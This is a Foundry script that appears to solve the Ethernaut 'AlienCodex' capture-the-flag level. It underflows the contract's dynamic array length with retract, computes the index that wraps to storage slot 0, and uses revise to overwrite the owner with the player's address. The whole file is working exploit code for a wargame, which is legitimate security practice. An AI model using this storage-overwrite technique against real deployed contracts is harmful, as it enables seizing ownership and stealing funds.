// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/AlienCodex.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AlienCodexSolution is Script {
    AlienCodex public alienCodex = AlienCodex(0xc1c91271ae0905a55dA2F905DF40D68c02b7A592);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before Owner : ", alienCodex.owner());
        console.log("isOwner : ", alienCodex.isOwner());

        bytes32 attackerAddress = bytes32(uint256(uint160(vm.envAddress("MY_ADDRESS"))));

        console.log("Attacker Address : ", uint256(attackerAddress));

        alienCodex.makeContact();
        alienCodex.retract();

        uint targetAddress = ((2 ** 256 - 1) - uint(keccak256(abi.encode(1)))) + 1;

        alienCodex.revise(targetAddress, bytes32(attackerAddress));

        console.log("After Owner : ", alienCodex.owner());

        vm.stopBroadcast();
    }
}